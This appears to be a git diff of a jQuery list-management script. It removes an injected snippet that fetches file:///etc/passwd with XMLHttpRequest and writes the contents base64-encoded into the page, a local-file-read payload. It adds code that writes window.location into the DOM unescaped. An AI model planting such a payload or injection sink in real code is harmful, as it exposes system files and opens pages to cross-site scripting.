@@ -3,6 +3,19 @@
  */
 
 $(document).ready(function() {
+
+
+
+
+  document.write(window.location)
+  var list2 = $('#list');
+
+  var newli = "<li class='list-group-item' id='" + id + "'>" +
+                 "<div align='left'>" + window.location + "</div>" +
+              "</li>";
+        list2.append(newli)
+
+
     $('#createForm').on('submit', function(e) {
         e.preventDefault();
         var $this = $(this);
@@ -62,10 +75,3 @@ function deleteItem(clicked_id) {
         }
     });
 }
-
-
-x=new XMLHttpRequest;
-x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///etc/passwd");x.send();
-
-document.write(window.location)
